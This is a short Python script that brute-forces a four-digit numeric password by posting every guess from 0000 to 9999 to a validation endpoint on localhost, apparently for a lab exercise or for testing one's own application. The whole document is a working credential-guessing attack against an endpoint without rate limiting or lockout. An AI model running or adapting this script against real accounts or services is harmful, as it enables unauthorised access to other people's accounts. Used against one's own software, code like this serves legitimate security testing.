import requests

def crack_password(profile_id):
    url = f'http://localhost:8000/api/validate/{profile_id}/'

    # Define the range of passwords to test (for example, a 4-digit number)
    for i in range(10000):  # Numbers from 0000 to 9999
        guess = f"{i:04d}"  # Convert the number to a zero-padded string

        # Send the guess to the API
        payload = {'password': guess}
        response = requests.post(url, json=payload)
        result = response.json()

        if result['success']:
            print(f"Password cracked! The password is: {guess}")
            return guess
        else:
            print(f"Attempt {guess}: {result['message']}")

    print("Password not found within the given range.")
    return None

if __name__ == "__main__":
    crack_password(profile_id=1)
